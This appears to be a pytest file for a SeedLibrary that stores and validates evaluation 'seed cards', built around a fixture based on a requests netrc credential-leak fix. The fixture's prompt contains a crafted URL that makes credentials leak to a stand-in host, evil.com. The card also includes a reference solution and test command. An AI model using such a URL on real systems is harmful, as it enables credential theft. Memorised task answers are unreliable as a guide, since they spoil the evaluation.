"""spec-0010/T1：SeedLibrary 读写 + 卡 schema round-trip + 契约约束校验。"""

from __future__ import annotations

import pytest

from auto_designer.distill.seed_library import (
    CAPABILITY_TAXONOMY,
    DOMAIN_VOCAB,
    SeedLibrary,
    validate_card,
)


def _card(seed_id: str = "seed-requests-6964") -> dict:
    # seed-card-schema.md 卡形状；字段长相取自真实 harvest 示例（psf/requests netrc 泄露修复）。
    return {
        "id": seed_id,
        "source": {
            "type": "closed_issue+fix_pr",
            "repo": "psf/requests",
            "issue_url": "https://github.com/psf/requests/issues/6964",
            "fix_ref": "https://github.com/psf/requests/pull/6965 (merged 2025-06)",
            "not_in_benchmark": True,
        },
        "task": {
            "prompt": (
                "i keep creds in my ~/.netrc for example.com. when i call "
                "requests.get('http://example.com:@evil.com/') my creds leak to evil.com. "
                "can you make it stop?"
            ),
            "context": "requests, a ~/.netrc with credentials, a crafted URL with empty userinfo before an @",
        },
        "domain": "web-backend",
        "capability_probed": ["correctness-edgecase"],
        "difficulty": "medium",
        "scope": "single-file",
        "autonomy_required": "collaborative",
        "oracle": {
            "tier": "executable-test",
            "spec": "regression test in PR #6962 (FAIL@parent -> PASS@fix)",
            "reference_solution": "PR #6965: resolve netrc host from urlparse().hostname",
            "confidence": "high",
        },
        "env": {
            "reproducible": "easy",
            "base_image": "python:3.11",
            "repo_at": "0e322af87745eff34caffe4df68456ebc20d9068",
            "setup": ["pip install -e .", "pip install -r requirements-dev.txt"],
            "test_cmd": "pytest tests/test_utils.py -k netrc",
            "external_deps": "none",
            "budget": {"timeout_s": 300, "mem_gb": 2},
        },
        "pairing_constraints": {"domain": "web-backend", "min_capability": "competent"},
        "gates": {"oracle_gate": "pass", "harbor_repro_gate": "pass"},
        "provenance": {
            "resolution_quote": 'uses the "hostname" attribute from the parsed url to get the host',
            "source": "https://github.com/psf/requests/pull/6962",
        },
    }


def test_empty_library_loads_empty(tmp_path) -> None:
    lib = SeedLibrary(tmp_path / "seeds.json")
    assert lib.load() == []


def test_add_then_load_and_get(tmp_path) -> None:
    lib = SeedLibrary(tmp_path / "seeds.json")
    card = _card()
    lib.add(card)

    loaded = lib.load()
    assert len(loaded) == 1
    assert loaded[0] == card
    assert lib.get("seed-requests-6964") == card


def test_load_tolerates_harvest_envelope(tmp_path) -> None:
    # harvest 产出的 {version, harvested_at, note, seeds:[...]} 信封：load 取 seeds、忽略元数据键。
    import json

    path = tmp_path / "seeds.json"
    path.write_text(
        json.dumps(
            {"version": 1, "harvested_at": "2026-07-02", "note": "x", "seeds": [_card("seed-a")]},
            ensure_ascii=False,
        ),
        encoding="utf-8",
    )
    lib = SeedLibrary(path)
    loaded = lib.load()
    assert len(loaded) == 1
    assert loaded[0]["id"] == "seed-a"
    assert lib.get("seed-a")["id"] == "seed-a"


def test_get_missing_raises_keyerror(tmp_path) -> None:
    lib = SeedLibrary(tmp_path / "seeds.json")
    lib.add(_card("seed-a"))
    with pytest.raises(KeyError):
        lib.get("does-not-exist")


def test_card_roundtrips_and_tolerates_unknown_keys(tmp_path) -> None:
    lib = SeedLibrary(tmp_path / "seeds.json")
    card = _card()
    # 演化友好：未知键应被原样保留、读侧不报错（前向兼容）。
    card["future_field"] = {"note": "schema 演化新增"}
    lib.add(card)
    got = lib.get(card["id"])
    assert got == card  # 字段级一致，含 source/task/env/oracle/gates/provenance 与未知键
    # held-out 字段随卡沉淀（采集侧保留；注入侧才剥离，见 0010/T2）。
    assert got["oracle"]["tier"] == "executable-test"
    assert got["env"]["test_cmd"] == "pytest tests/test_utils.py -k netrc"
    assert got["gates"]["oracle_gate"] == "pass"


def test_validate_card_rejects_benchmark_field() -> None:
    bad = _card()
    bad["benchmark_score"] = 0.87  # 契约外字段（benchmark 派生）→ 必拒
    with pytest.raises(ValueError, match="契约外字段"):
        validate_card(bad)


def test_validate_card_rejects_not_in_benchmark_false() -> None:
    bad = _card()
    bad["source"]["not_in_benchmark"] = False  # benchmark 实例 → 必拒（防污染）
    with pytest.raises(ValueError, match="not_in_benchmark"):
        validate_card(bad)


def test_validate_card_rejects_domain_out_of_vocab() -> None:
    bad = _card()
    bad["domain"] = "quantum-computing"  # 不在受控词表
    with pytest.raises(ValueError, match="受控词表"):
        validate_card(bad)


def test_validate_card_rejects_capability_out_of_taxonomy() -> None:
    bad = _card()
    bad["capability_probed"] = ["correctness-edgecase", "telepathy"]  # telepathy 越表
    with pytest.raises(ValueError, match="分类法外能力"):
        validate_card(bad)


def test_valid_card_passes_validation() -> None:
    validate_card(_card())  # 不抛即通过
    assert _card()["domain"] in DOMAIN_VOCAB
    assert set(_card()["capability_probed"]) <= CAPABILITY_TAXONOMY
